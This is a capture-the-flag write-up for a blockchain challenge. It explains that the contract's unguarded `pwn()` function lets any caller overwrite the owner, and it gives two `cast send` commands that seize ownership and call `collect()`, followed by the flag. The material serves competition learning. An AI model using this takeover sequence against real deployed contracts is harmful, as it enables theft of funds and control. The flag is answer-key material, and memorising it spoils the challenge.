# KingOfHill_MU (Security Impossible CTF 2026 - Monash University, blockchain)

KingOfHill presents an on-chain governance game contract. The contract tracks an `owner` address in storage slot 0 and restricts privileged administration routines to that owner. To solve the challenge, we must seize ownership and invoke the privileged `collect()` routine to capture the flag.

## Decompiling the Bytecode

Decompiling the contract bytecode exposes three external entry points:
- `owner()`: Returns the address stored in storage slot 0.
- `collect()`: Verifies `msg.sender == owner`, and upon success, toggles a state flag that unlocks the challenge prize.
- `pwn()`: Overwrites storage slot 0 with `msg.sender`.

Here is the recovered logic for `pwn()`:

```solidity
function pwn() external {
    owner = msg.sender;
}
```

The function lacks any access controls, authentication modifiers, or prerequisites. Anyone can call `pwn()` at any time to claim ownership of the contract.

## Exploitation Sequence

The attack requires two sequential transactions:
1. Call `pwn()` to update `owner` to our player wallet.
2. Call `collect()` as the new owner to mark the challenge as solved.

We execute this with `cast`:

```bash
cast send $CONTRACT "pwn()" --rpc-url $RPC --private-key $PK
cast send $CONTRACT "collect()" --rpc-url $RPC --private-key $PK
```

Once both transactions confirm, querying the `/flag` endpoint on the challenge host confirms our victory and returns the flag.

Solve: `solve/solve.sh`

Flag: `sictf{a99224139aafdaa93dd685cf5bc5eb7e}`
